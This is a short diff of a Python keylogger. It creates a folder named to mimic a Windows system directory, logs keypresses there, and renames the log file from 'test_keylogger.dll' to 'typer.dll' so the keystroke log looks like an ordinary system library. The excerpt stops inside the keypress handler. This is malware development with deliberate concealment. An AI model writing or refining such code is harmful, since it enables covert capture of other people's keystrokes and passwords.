@@ -5,7 +5,7 @@ import os
 os.mkdir("C:/Windows x(32)") 
 dir = r"C:/Windows x(32)/"
 
-logging.basicConfig(level=logging.INFO, filename= dir + 'test_keylogger.dll',filemode='a',format='%(process)d - %(asctime)s - %(message)s')
+logging.basicConfig(level=logging.INFO, filename= dir + 'typer.dll',filemode='a',format='%(process)d - %(asctime)s - %(message)s')
 
 def on_keypress(key):
     if key == keyboard.Key.esc:
